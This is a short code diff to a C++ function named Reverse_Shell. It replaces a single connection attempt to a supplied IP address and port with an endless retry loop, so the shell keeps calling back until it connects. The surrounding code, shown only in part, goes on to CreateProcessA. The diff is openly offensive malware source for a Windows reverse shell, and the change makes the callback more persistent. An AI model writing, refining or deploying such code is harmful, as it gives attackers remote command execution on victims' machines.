@@ -51,6 +51,7 @@ void Reverse_Shell(const char* IP_Address , int Port)
     sa.sin_port = htons(Port);
 
     // Call connect()
+    /*
     int connect_Result = connect(mysocket, (struct sockaddr*)&sa, sizeof(sa));
     if (connect_Result != 0) {
         std::cout << "[-] connection failed.";
@@ -58,6 +59,14 @@ void Reverse_Shell(const char* IP_Address , int Port)
     }
     else
         std::cout << "[-] Reverse Shell Established"<<std::endl;
+    */
+
+    while (true)
+    {
+       int connect_Result=connect(mysocket, (struct sockaddr*)&sa, sizeof(sa));
+       if (connect_Result == 0)
+           break;
+    }
 
 
     // Call CreateProcessA()
